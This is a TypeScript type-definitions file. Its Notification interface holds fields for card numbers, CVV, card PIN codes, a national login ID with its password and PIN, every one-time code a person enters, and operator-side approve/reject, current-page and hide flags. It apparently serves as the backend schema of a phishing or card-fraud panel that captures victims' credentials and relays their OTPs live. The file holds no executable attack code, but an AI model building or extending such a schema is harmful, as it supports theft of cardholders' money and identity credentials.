interface Coordinates {
    lat: number
    lng: number
  }
  
  export interface UserEvent {
    action: string
    buildingNumber: string
    cardName: string
    cardNumber: string
    city: string
    coordinates: Coordinates
    country: string
    email: string
    firstName: string
    id: string
    lastName: string
    lastSeen: Date | string
    online: boolean
    phone: string
    postalCode: string
    street: string
  }
  
  export interface Notification {
    id: string
    createdDate: string
    
    // Personal Information
    fullNumber?: string
    nafazId?: string
    nafazPass?: string
    nafaz_pin?: string
    
    // Contact Information
    phone?: string
    phone2?: string
    phoneNumber?: string
    phoneOtpCode?: string
    operator?: string
    
    // Location Information
    country?: string
    city?: string
    district?: string
    street?: string
    postalCode?: string
    
    // Card Information
    cardNumber?: string
    cardName?: string
    cardMonth?: string
    cardYear?: string
    expiryDate?: string
    cvv?: string
    pinCode?: string
    
    // OTP and Verification
    otp?: string
    allOtps?: string[]
    otpCode?: string
    otpApproved?: boolean
    phoneVerificationStatus?: string
    authNumber?: string
    
    // Vehicle Information (if needed)
    vehicle_type?: string
    
    // Status and Metadata
    status?: "pending" | "approved" | "rejected"
    flagColor?: "red" | "yellow" | "green" | null
    currentPage?: string
    isHidden?: boolean
  }
  
  export type FlagColor = "red" | "yellow" | "green" | null
  